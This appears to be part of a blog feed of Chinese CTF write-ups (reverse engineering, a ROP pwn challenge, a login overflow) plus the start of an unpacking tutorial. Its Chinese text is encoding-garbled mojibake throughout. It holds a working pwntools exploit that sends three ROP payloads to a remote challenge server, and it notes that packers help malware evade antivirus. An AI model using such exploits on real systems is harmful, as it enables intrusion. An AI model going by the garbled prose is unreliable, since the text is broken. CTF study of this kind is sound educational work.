title="re50-é€ç¦åˆ©æ‹‰"></a>re50-é€ç¦åˆ©æ‹‰</h1><p>è¿™é¢˜æ˜¯ä¸€ä¸ªæœ‰å¤šè§£çš„é¢˜ç›®ã€‚ã€‚ã€‚å¾ˆå°´å°¬é˜¿<br>æ‰“å¼€ODå»è·Ÿï¼Œ<br>æ˜¯ä¸€ä¸ªç«‹å³æ•°çš„æ¯”è¾ƒ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg"></a></p><p>æ‰¾åˆ°è¿™ä¸ªcallï¼ŒF7è·Ÿè¿›å»</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg"></a></p><p>å‡ ä¸ªæ¯”è¾ƒéƒ½æ˜¯ä¸Šé¢çš„è¯­å¥ï¼Œå…¶ä¸­ss:[ebp+eax-0x40]ï¼Œåªæœ‰eaxçš„å€¼æ˜¯å˜åŒ–çš„ï¼Œeaxåˆæ˜¯å–å‡ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œæ‰€ä»¥è°ƒæ•´æˆ‘ä»¬çš„è¾“å…¥ï¼Œå°±å¯ä»¥æ§åˆ¶byte ptr ss:[ebp+eax-0x40]çš„å€¼ï¼Œä½¿è·³è½¬æ¡ä»¶ä¸æˆç«‹ã€‚è¿™å‡ ä¸ªæ¯”è¾ƒä¸­ï¼Œæ˜¯åˆ†åˆ«ä¸2ã€8ã€9ã€3ã€9ã€8ã€9ã€8ï¼Œç„¶è€Œæ˜¯æ ˆä¸­æœ‰è¿™å‡ ä¸ªæ•°çš„åœ°æ–¹ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„ä¸¤ä¸²ç«‹å³æ•°ã€‚æ‰€ä»¥è¦è°ƒæ•´è¾“å…¥ï¼Œä½¿ss:[ebp+eax-0x40]çš„å€¼åˆ†åˆ«ä¸º2,8,9,3,9,8,9ï¼Œ8çš„æ ˆåœ°å€ã€‚<br>æ‰€ä»¥åªè¦æ§åˆ¶æˆ‘çš„è¾“å…¥ï¼Œåˆ°å’Œå‡ ä¸ªç«‹å³æ•°ç›¸ç¬¦å°±å¥½äº†ï¼Œæˆ‘è¿™é‡Œå¾—åˆ°çš„æ˜¯ 20161010<br>æ‰€ä»¥æˆ‘è¿™çš„flagæ˜¯ SYC[20161010]</p><h1 id="Re200-ä½ ä»¬è¦çš„æä¹å‡€åœŸ"><a href="#Re200-ä½ ä»¬è¦çš„æä¹å‡€åœŸ" class="headerlink" title="Re200-ä½ ä»¬è¦çš„æä¹å‡€åœŸ"></a>Re200-ä½ ä»¬è¦çš„æä¹å‡€åœŸ</h1><p>å¬äº†æä¹å‡€åœŸæ ¹æœ¬åœï¼ä¸ï¼ä¸‹ï¼æ¥ï¼ å¬è¯´åªè¦ç»•è¿‡è¿™äº›å¼¹å‡ºçš„å¯¹è¯æ¡†å°±å¯ä»¥å¾—åˆ°flagäº†ï¼Œå®Œå…¨ä¸ç”¨é€†å‘å“¦ã€‚ have fun :)  æç¤ºï¼šinline hook</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png"></a></p><p>è¿™ä¸ªé¢˜ç›®éŸ³ä¹å¤ªå¥½å¥½å¬äº†ï¼Œæˆ‘éƒ½èˆä¸å¾—åœä¸‹æ¥äº†ã€‚æ¶å¿ƒçš„æ˜¯è¿™å¼¹çª—å¥½å¯æ€•ï¼Œè¿˜å¥½çš„æ˜¯é¢˜ç›®è¯´äº†ï¼Œå¼¹çª—æ²¡äº†ï¼Œflagå°±å‡ºæ¥äº†ï¼Œè¿™ä¸å°±æ˜¯å’±ä»¬ç»å¸¸é‡åˆ°çš„å»å¹¿å‘Šï¼Œå»å¼¹çª—çš„é—®é¢˜å—ã€‚<br>ç”¨ODåŠ è½½ï¼Œ<br>ä»¥ä¸ºå»çª—å£æˆ‘ç›´æ¥ï¼ŒCtrl+Gï¼Œæ‰¾åˆ°æˆ‘è¦å»çš„API</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png"></a></p><p>ç‚¹å‡»ç¡®å®šï¼Œ<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png"></a></p><p>åœ¨è¿™ä¸ªåœ°æ–¹ä¸‹æ®µï¼Œå¹¶ä¸”å°†push ebpæ”¹æˆret ç›´æ¥è®©ä»–è¿”å›</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png"></a></p><p>F9è¿è¡Œåˆ°æ–­ç‚¹ï¼Œè¾“å…¥flagï¼Œç­‰å¾…å‡ ç§’é’ŸåŠ å¯†åçš„flagå°±å‡ºæ¥äº†æ‰€ä»¥è¿™é‡Œçš„flagæ˜¯<br>SYC{F6A9D22C3018693B2FCC1B2D357F7AEAc}</p><h1 id="pwn200-Rop-rop-rop"><a href="#pwn200-Rop-rop-rop" class="headerlink" title="pwn200-Rop-rop-rop"></a>pwn200-Rop-rop-rop</h1><p>å¬è¯´çœŸæ­£çš„é­”æ³•å¸ˆéƒ½ä¼šropï¼Œä½ æ˜¯ä»–çš„ç²‰ä¸å—ï¼Ÿ<a href="https://pan.baidu.com/s/1o8Tipw2">https://pan.baidu.com/s/1o8Tipw2</a> nc 222.18.158.228 12341 ï¼ˆpwnçš„é¢˜ç›®æœ‰åŠ åˆ†å“¦ï¼Œæ­¤é¢˜è§£å‡ºå¾—400åˆ†ï¼‰</p><p>æœ€åæ˜¯ä¸€ä¸ªpwnçš„é¢˜ç›®ï¼Œæ¯•ç«Ÿæ˜¯ç»™æ–°äººåšçš„ï¼Œè¿™ä¸ªé¢˜ç›®è¿˜æ˜¯æ»¡å‹å–„çš„ï¼Œstepéƒ½å‘Šè¯‰æˆ‘ä»¬äº†ï¼Œå…ˆç”¨IDAæ‰“å¼€ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png"></a></p><p>è¿™é‡Œçš„å…³é”®æ˜¯æ€ä¹ˆç»•è¿‡if ( strlen(p) &gt; 7 )çš„åˆ¤æ–­ï¼Œæˆ‘é€‰æ‹©ç”¨<br>\x00è¿›è¡Œæˆªæ–­ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png"></a></p><p>é¢˜ç›®è¿˜ç»™äº†ä¸å°‘æç¤ºï¼Œé¢˜ç›®çš„åå­—å’Œè¿™é‡Œéƒ½å¾ˆæ˜æ˜¾çš„å‘Šè¯‰æˆ‘ä»¬è¦æœ‰ä¸‰ä¸ªçš„ropï¼Œé‚£å°±é¡ºç€é¢˜ç›®çš„æ„æ€æ¥å§ï¼Œè¿™é‡Œè¿›è¡Œæ„é€ payloadï¼Œ<br>ropé“¾è¿˜è¦ç¬¦åˆstep1-3çš„check</p><p>çœ‹ä¸€ä¸‹step3çš„ä¼ªä»£ç </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png"></a></p><p>é¢˜ç›®ä¹Ÿç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªcmdè¿™è¿˜æ˜¯è›®å‹å¥½çš„ã€‚ã€‚ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png"></a><br>æ‰€ä»¥æœ€åçš„expå·²ç»å¾ˆå¥½å†™äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;222.18.158.228&quot;</span>,<span class="number">12341</span>)</span><br><span class="line"><span class="comment"># print r.recvuntil(&quot;Input&quot;)</span></span><br><span class="line"></span><br><span class="line">step1Addr = <span class="number">0x0804871e</span></span><br><span class="line">step2Addr = <span class="number">0x08048766</span></span><br><span class="line">step3Addr = <span class="number">0x080487a3</span></span><br><span class="line">mainAddr = <span class="number">0x0804867d</span></span><br><span class="line"></span><br><span class="line">shellcodeBuf = <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span> + chr(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">payload1 = shellcodeBuf + p32(step1Addr) + p32(mainAddr) + p32(<span class="number">0</span>) + p32(<span class="number">0x41414141</span>) + <span class="string">&#x27;\xd5\xc4\xb3\xa2&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = shellcodeBuf + p32(step2Addr) + p32(mainAddr) + p32(<span class="number">0xff25a7d4</span>)+ p32(<span class="number">0x41414141</span>)</span><br><span class="line"></span><br><span class="line">payload3 = shellcodeBuf + p32(step3Addr) + p32(mainAddr) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xc0c0c0c</span>) + p32(<span class="number">0x9a829a82</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> sycsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUCA çš„éƒ¨åˆ†pwn-2016</title>
      <link href="2016-NUCA-pwn-Writeup.html"/>
      <url>2016-NUCA-pwn-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ä¸€ç›´æ²¡æ•¢åšçš„pwn  ä»Šå¤©NUCAæŠŠé¢˜é‡æ–°æ”¾äº†å‡ºæ¥</p><p>äº‹åå‘ç°å…¶å®æŒºç®€å•</p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/3620347.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/3620347.jpg"></a></p><p>å°†æˆ‘ä»¬è¾“å…¥çš„å¯†ç è¿›è¡Œäº†base64ç¼–ç </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/46920513.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/46920513.jpg"></a></p><p>ç„¶åæ‰“å¼€password.txt<br>åœ¨ä¸»å‡½æ•°æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åœ°æ–¹<br>å°±æ˜¯å¦‚æœstaus==Y é‚£ä¹ˆä¼šè¯»å–flagçš„å†…å®¹<br>é—®é¢˜æ¥æ€ä¹ˆæ ·stausæ‰ä¼šç­‰äº<code>Y</code><br>ä»ä¼ªä»£ç ä¸­æˆ‘ä»¬çŸ¥é“  <code>!verify()</code>çš„æ—¶å€™æˆ‘ä»¬æ‰èƒ½å¾—åˆ°flag</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/83392328.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/83392328.jpg"></a></p><p>çœ‹çœ‹ç›¸å…³å‡½æ•°<br>åªè¦ç¼–ç åçš„ç»“æœè¦†ç›–åé¢çš„æ ‡å¿—ä½ä¸ºYå³å¯ï¼Œæ‰€ä»¥å‘é€ä¸€å †Xå°±å¯è·å¾—flag</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nuca </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å­¦ä¹ â€”â€”è„±å£³æ–¹æ³•</title>
      <link href="The_hulling_method.html"/>
      <url>The_hulling_method.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ä»€ä¹ˆæ˜¯å£³"><a href="#ä»€ä¹ˆæ˜¯å£³" class="headerlink" title="ä»€ä¹ˆæ˜¯å£³"></a>ä»€ä¹ˆæ˜¯å£³</h1><p>å¤§å®¶åº”è¯¥å…ˆæ˜ç™½â€œå£³â€çš„æ¦‚å¿µã€‚åœ¨è‡ªç„¶ç•Œä¸­ï¼Œæˆ‘æƒ³å¤§å®¶å¯¹â€å£³â€è¿™ä¸œè¥¿åº”è¯¥éƒ½ä¸ä¼šé™Œç”Ÿäº†ï¼Œæ¤ç‰©ç”¨å®ƒæ¥ä¿æŠ¤ç§å­ï¼ŒåŠ¨ç‰©ç”¨å®ƒæ¥ä¿æŠ¤èº«ä½“ç­‰ç­‰ã€‚åŒæ ·ï¼Œåœ¨ä¸€äº›è®¡ç®—æœºè½¯ä»¶é‡Œä¹Ÿæœ‰ä¸€æ®µä¸“é—¨è´Ÿè´£ä¿æŠ¤è½¯ä»¶ä¸è¢«éæ³•ä¿®æ”¹æˆ–åç¼–è¯‘çš„ç¨‹åºã€‚å®ƒä»¬ä¸€èˆ¬éƒ½æ˜¯å…ˆäºç¨‹åºè¿è¡Œï¼Œæ‹¿åˆ°æ§åˆ¶æƒï¼Œç„¶åå®Œæˆå®ƒä»¬ä¿æŠ¤è½¯ä»¶çš„ä»»åŠ¡ã€‚å°±åƒåŠ¨æ¤ç‰©çš„å£³ä¸€èˆ¬éƒ½æ˜¯åœ¨èº«ä½“å¤–é¢ä¸€æ ·ç†æ‰€å½“ç„¶ï¼ˆå½“ç„¶åæ¥ä¹Ÿå‡ºç°äº†æ‰€è°“çš„â€œå£³ä¸­å¸¦ç±½â€çš„å£³ï¼‰ã€‚ç”±äºè¿™æ®µç¨‹åºå’Œè‡ªç„¶ç•Œçš„å£³åœ¨åŠŸèƒ½ä¸Šæœ‰å¾ˆå¤šç›¸åŒçš„åœ°æ–¹ï¼ŒåŸºäºå‘½åçš„è§„åˆ™ï¼Œå¤§å®¶å°±æŠŠè¿™æ ·çš„ç¨‹åºç§°ä¸ºâ€œå£³â€äº†ã€‚å°±åƒè®¡ç®—æœºç—…æ¯’å’Œè‡ªç„¶ç•Œçš„ç—…æ¯’ä¸€æ ·ï¼Œå…¶å®éƒ½æ˜¯å‘½åä¸Šçš„æ–¹æ³•ç½¢äº†ã€‚</p><h1 id="å£³çš„ä½œç”¨"><a href="#å£³çš„ä½œç”¨" class="headerlink" title="å£³çš„ä½œç”¨"></a>å£³çš„ä½œç”¨</h1><p>1 å†™å¥½ä¸€ä¸ªç¨‹åºåï¼Œä¸æƒ³è®©åˆ«äººéšä¾¿æ›´æ”¹å…¶ä¸­çš„ç‰ˆæƒä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åŠ å£³å¯¹å…¶è¿›è¡Œä¿æŠ¤é˜²æ­¢è¢«ä¿®æ”¹ã€‚<br>2 å¯ä»¥åˆ©ç”¨å‹ç¼©å£³å‡å°‘ç¨‹åºå®¹é‡ï¼Œæ–¹ä¾¿ç¨‹åºä¼ æ’­ã€‚<br>3 å¸®åŠ©æœ¨é©¬ç—…æ¯’è¿›è¡Œå…æ€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ å£³å…æ€ï¼Œä¹Ÿå¯ä»¥è„±å£³å¯¹å…¶ä»£ç è¿›è¡Œä¿®æ”¹ä»è€Œèº²è¿‡æ€æ¯’è½¯ä»¶çš„æŸ¥æ€ã€‚</p><h1 id="è„±å£³çš„åŸºç¡€çŸ¥è¯†"><a href="#è„±å£³çš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="è„±å£³çš„åŸºç¡€çŸ¥è¯†"></a>è„±å£³çš„åŸºç¡€çŸ¥è¯†</h1><h2 id="1å£³æ˜¯æ€ä¹ˆè£…è½½çš„ï¼Ÿ"><a href="#1å£³æ˜¯æ€ä¹ˆè£…è½½çš„ï¼Ÿ" class="headerlink" title="1å£³æ˜¯æ€ä¹ˆè£…è½½çš„ï¼Ÿ"></a>1å£³æ˜¯æ€ä¹ˆè£…è½½çš„ï¼Ÿ</h2><p>   å£³è‡ªä»åŠ åˆ°ç¨‹åºä¸Šä»¥åå°±è¿åœ¨ä¸€èµ·äº†ï¼Œå³å¯¹ç¨‹åºè¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢è¢«ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯å£³æŠŠç¨‹åºç»™åŒ…è£¹èµ·æ¥äº†ï¼Œè€Œä¸”åŸç¨‹åºçš„æ•°æ®ä¹Ÿè¢«å‹ç¼©äº†ã€‚<br>    è£…è½½çš„æ—¶å€™é€šå¸¸æ˜¯å…ˆæ‰§è¡Œå£³åå†è·³åˆ°çœŸæ­£çš„åŸç¨‹åºOEPï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰ï¼Œè¿™æ—¶å¼€å§‹è¿è¡ŒåŸå…ˆæ²¡åŠ å£³çš„ç¨‹åºã€‚<br>è¿è¡Œé¡ºåºï¼šæ‰§è¡Œå¸¦å£³æ–‡ä»¶â€”â€”æ‰§è¡Œå£³â€”â€”æ‰§è¡Œåˆ°ç¨‹åºå…¥å£ç‚¹â€”â€”è¿è¡ŒæœªåŠ å£³çš„ç¨‹åºã€‚</p><h2 id="å£³çš„åˆ†ç±»"><a href="#å£³çš„åˆ†ç±»" class="headerlink" title="å£³çš„åˆ†ç±»"></a>å£³çš„åˆ†ç±»</h2><p>å£³å‡ºäºç¨‹åºä½œè€…æƒ³å¯¹ç¨‹åºèµ„æºå‹ç¼©ã€æ³¨å†Œä¿æŠ¤çš„ç›®çš„ï¼Œå£³ä¸€èˆ¬åˆ†ä¸ºå‹ç¼©å£³å’ŒåŠ å¯†å£³ä¸¤ç±»ã€‚<br>å‹ç¼©å£³ï¼šä¸€èˆ¬åªå¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©å¤„ç†ï¼Œæ—¢å‹ç¼©åŒºæ®µå’Œä¸€äº›èµ„æºå‹ç¼©ï¼Œä»¥å‡å°‘æ–‡ä»¶ä½“ç§¯ä¸ºç›®çš„<br>å¦‚ï¼šASPackã€UPXã€PECompactç­‰<br>åŠ å¯†å£³ï¼šè·Ÿå‹ç¼©å£³æ­£å¥½ç›¸åï¼Œä¸€èˆ¬æ˜¯ç‰ºç‰²å‡å°‘ä½“ç§¯ä¸ºä»£ä»·ï¼Œå¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œç”¨ä¸Šå„ç§åè·Ÿè¸ªæŠ€æœ¯ä¿æŠ¤ç¨‹åºä¸è¢«è°ƒè¯•ã€è„±å£³ï¼Œ<br>å¦‚ï¼šASProtectã€Armadilloã€EXECryptorç­‰<br>ä½†éšç€åŠ å£³æŠ€æœ¯çš„å‘å±•ï¼Œè¿™ä¸¤ç±»å£³ä¹‹é—´çš„ç•Œé™è¶Šæ¥è¶Šæ¨¡ç³Šï¼Œå¾ˆå¤šåŠ å£³è½¯ä»¶æ—¢æœ‰å‹ç¼©åŠŸèƒ½ä¹Ÿæœ‰ä¿æŠ¤æ€§èƒ½ï¼Œè€Œä¸”ç°åœ¨å¾ˆå¤šåŠ å¯†å£³è¾¾åˆ°å£³ä¸­å¸¦è‚‰ï¼Œè‚‰ä¸­å¸¦å£³çš„åœ°æ­¥äº†ã€‚</p><h2 id="OEP-ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰"><a href="#OEP-ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰" class="headerlink" title="OEP ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰"></a>OEP ï¼ˆç¨‹åºå…¥å£ç‚¹ï¼‰</h2><p>   OEPï¼šOriginal Entry Point ï¼Œç¨‹åºåŠ å£³å‰çœŸæ­£çš„å…¥å£ç‚¹ã€‚</p><h2 id="è„±å£³çš„åŸºæœ¬æ­¥éª¤"><a href="#è„±å£³çš„åŸºæœ¬æ­¥éª¤" class="headerlink" title="è„±å£³çš„åŸºæœ¬æ­¥éª¤"></a>è„±å£³çš„åŸºæœ¬æ­¥éª¤</h2><p>æŸ¥å£³(PEIDã€FIã€PE-SCAN)â€”&gt;å¯»æ‰¾OEP(OD)â€”&gt;è„±å£³/Dump(LordPEã€PeDumperã€ODè‡ªå¸¦çš„è„±å£³æ’ä»¶ã€PETools)â€”&gt;ä¿®å¤(Import REConstructor)</p><h1 id="å¸¸ç”¨è„±å£³æ–¹æ³•"><a href="#å¸¸ç”¨è„±å£³æ–¹æ³•" class="headerlink" title="å¸¸ç”¨è„±å£³æ–¹æ³•"></a>å¸¸ç”¨è„±å£³æ–¹æ³•</h1><h2 id="å•æ­¥è·Ÿè¸ªæ³•"><a href="#å•æ­¥è·Ÿè¸ªæ³•" class="headerlink" title="å•æ­¥è·Ÿè¸ªæ³•"></a>å•æ­¥è·Ÿè¸ªæ³•</h2><p>ï¼ˆ1ï¼‰ç”¨ODè½½å…¥ï¼Œç‚¹â€œä¸åˆ†æä»£ç â€<br>ï¼ˆ2ï¼‰.å•æ­¥å‘ä¸‹è·Ÿè¸ªF8ï¼Œå®ç°å‘ä¸‹çš„è·³ã€‚ä¹Ÿå°±æ˜¯è¯´å‘ä¸Šçš„è·³ä¸è®©å…¶å®ç°ï¼ˆé€šè¿‡F4ï¼‰<br>ï¼ˆ3ï¼‰é‡åˆ°ç¨‹åºå¾€å›è·³çš„ï¼ˆåŒ…æ‹¬å¾ªç¯ï¼‰ï¼Œæˆ‘ä»¬åœ¨ä¸‹ä¸€å¥ä»£ç å¤„æŒ‰F4ï¼ˆæˆ–è€…å³å¥å•å‡»ä»£ç ï¼Œé€‰                     æ‹©æ–­ç‚¹â€”â€”&gt;è¿è¡Œåˆ°æ‰€é€‰ï¼‰<br>ï¼ˆ4ï¼‰ç»¿è‰²çº¿æ¡è¡¨ç¤ºè·³è½¬æ²¡å®ç°ï¼Œä¸ç”¨ç†ä¼šï¼Œçº¢è‰²çº¿æ¡è¡¨ç¤ºè·³è½¬å·²ç»å®ç°<br>ï¼ˆ5ï¼‰å¦‚æœåˆšè½½å…¥ç¨‹åºï¼Œåœ¨é™„è¿‘å°±æœ‰ä¸€ä¸ªCALLçš„ï¼Œæˆ‘ä»¬å°±F7è·Ÿè¿›å»ï¼Œä¸ç„¶ç¨‹åºå¾ˆå®¹æ˜“è·‘  é£ï¼Œè¿™æ ·å¾ˆå¿«å°±èƒ½åˆ°ç¨‹åºçš„OEP<br>ï¼ˆ6ï¼‰åœ¨è·Ÿè¸ªçš„æ—¶å€™ï¼Œå¦‚æœè¿è¡Œåˆ°æŸä¸ªCALLç¨‹åºå°±è¿è¡Œçš„ï¼Œå°±åœ¨è¿™ä¸ªCALLä¸­F7è¿›å…¥<br>ï¼ˆ7ï¼‰ä¸€èˆ¬æœ‰å¾ˆå¤§çš„è·³è½¬ï¼ˆå¤§è·¨æ®µï¼‰ï¼Œæ¯”å¦‚ jmp XXXXXX æˆ–è€… JE XXXXXX æˆ–è€…æœ‰RETN  çš„ä¸€èˆ¬å¾ˆå¿«å°±ä¼šåˆ°ç¨‹åºçš„OEP<br>æ³¨ï¼šåœ¨æœ‰äº›å£³æ— æ³•å‘ä¸‹è·Ÿè¸ªçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é™„è¿‘æ‰¾åˆ°æ²¡æœ‰å®ç°çš„å¤§è·³è½¬ï¼Œå³é”®â€“&gt;â€œè·Ÿéšâ€,ç„¶åF2ä¸‹æ–­ï¼ŒShift+F9è¿è¡Œåœåœ¨â€œè·Ÿéšâ€çš„ä½ç½®ï¼Œå†å–æ¶ˆæ–­ç‚¹ï¼Œç»§ç»­F8å•æ­¥è·Ÿè¸ªã€‚ä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥è½»æ¾åˆ°è¾¾OEP</p><h2 id="ESPå®šå¾‹æ³•"><a href="#ESPå®šå¾‹æ³•" class="headerlink" title="ESPå®šå¾‹æ³•"></a>ESPå®šå¾‹æ³•</h2><p>   ESPå®šç†è„±å£³ï¼ˆESPåœ¨ODçš„å¯„å­˜å™¨ä¸­ï¼Œæˆ‘ä»¬åªè¦åœ¨å‘½ä»¤è¡Œä¸‹ESPçš„ç¡¬ä»¶è®¿é—®æ–­ç‚¹ï¼Œå°±ä¼šä¸€ä¸‹æ¥åˆ°ç¨‹åºçš„OEPäº†ï¼ï¼‰<br>ï¼ˆ1ï¼‰å¼€å§‹å°±ç‚¹F8ï¼Œæ³¨æ„è§‚å¯ŸODå³ä¸Šè§’çš„å¯„å­˜å™¨ä¸­ESPæœ‰æ²¡çªç°ï¼ˆå˜æˆçº¢è‰²ï¼‰ï¼ˆè¿™åªæ˜¯ä¸€  èˆ¬æƒ…å†µä¸‹ï¼Œæ›´ç¡®åˆ‡çš„è¯´æˆ‘ä»¬é€‰æ‹©çš„ESPå€¼æ˜¯å…³é”®å¥ä¹‹åçš„ç¬¬ä¸€ä¸ªESPå€¼ï¼‰<br>ï¼ˆ2ï¼‰åœ¨å‘½ä»¤è¡Œä¸‹ï¼šdd XXXXXXXX(æŒ‡åœ¨å½“å‰ä»£ç ä¸­çš„ESPåœ°å€ï¼Œæˆ–è€…æ˜¯hr XXXXXXXX)ï¼Œ  æŒ‰å›è½¦<br>ï¼ˆ3ï¼‰é€‰ä¸­ä¸‹æ–­çš„åœ°å€ï¼Œæ–­ç‚¹â€”&gt;ç¡¬ä»¶è®¿â€”&gt;WORDæ–­ç‚¹<br>ï¼ˆ4ï¼‰æŒ‰ä¸€ä¸‹F9è¿è¡Œç¨‹åºï¼Œç›´æ¥æ¥åˆ°äº†è·³è½¬å¤„ï¼ŒæŒ‰ä¸‹F8ï¼Œåˆ°è¾¾ç¨‹åºOEP</p><h2 id="å†…å­˜é•œåƒæ³•"><a href="#å†…å­˜é•œåƒæ³•" class="headerlink" title="å†…å­˜é•œåƒæ³•"></a>å†…å­˜é•œåƒæ³•</h2><p>ï¼ˆ1ï¼‰ç”¨ODæ‰“å¼€è½¯ä»¶<br>ï¼ˆ2ï¼‰ç‚¹å‡»é€‰é¡¹â€”â€”è°ƒè¯•é€‰é¡¹â€”â€”å¼‚å¸¸ï¼ŒæŠŠé‡Œé¢çš„å¿½ç•¥å…¨éƒ¨âˆšä¸Šã€‚CTRL+F2é‡è½½ä¸‹ç¨‹åº<br>ï¼ˆ3ï¼‰æŒ‰ALT+M,æ‰“å¼€å†…å­˜é•œè±¡ï¼Œæ‰¾åˆ°ç¨‹åºçš„ç¬¬ä¸€ä¸ª.rsrc.æŒ‰F2ä¸‹æ–­ç‚¹ï¼Œç„¶åæŒ‰SHIFT+F9è¿  è¡Œåˆ°æ–­ç‚¹ï¼Œæ¥ç€å†æŒ‰ALT+M,æ‰“å¼€å†…å­˜é•œè±¡ï¼Œæ‰¾åˆ°ç¨‹åºçš„ç¬¬ä¸€ä¸ª.rsrc.ä¸Šé¢çš„.CODEï¼ˆä¹Ÿ  